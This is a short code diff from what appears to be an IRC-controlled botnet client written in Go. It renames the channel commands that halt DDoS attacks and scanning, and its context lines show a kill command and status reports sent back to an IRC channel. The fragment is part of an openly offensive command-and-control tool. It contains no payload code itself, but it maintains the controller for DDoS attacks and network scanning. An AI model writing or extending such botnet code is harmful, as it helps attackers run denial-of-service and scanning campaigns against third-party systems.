@@ -91,10 +91,10 @@ func main() {
 				tools.ReportInf(irc, IRC_Channel)
 			} else if tools.IRC_Find(ircRead, "?kill") {
 				os.Exit(0)
-			} else if tools.IRC_Find(ircRead, "?stopddos") {
+			} else if tools.IRC_Find(ircRead, "?ddosstop") {
 				tools.DDoS_Switch = true
 				tools.IRC_Report(irc, IRC_Channel, "STOP ATTACKING.")
-			} else if tools.IRC_Find(ircRead, "?stopscan") {
+			} else if tools.IRC_Find(ircRead, "?scanstop") {
 				tools.Scan_Switch = true
 				tools.IRC_Report(irc, IRC_Channel, "STOP SCANNING.")
 			}
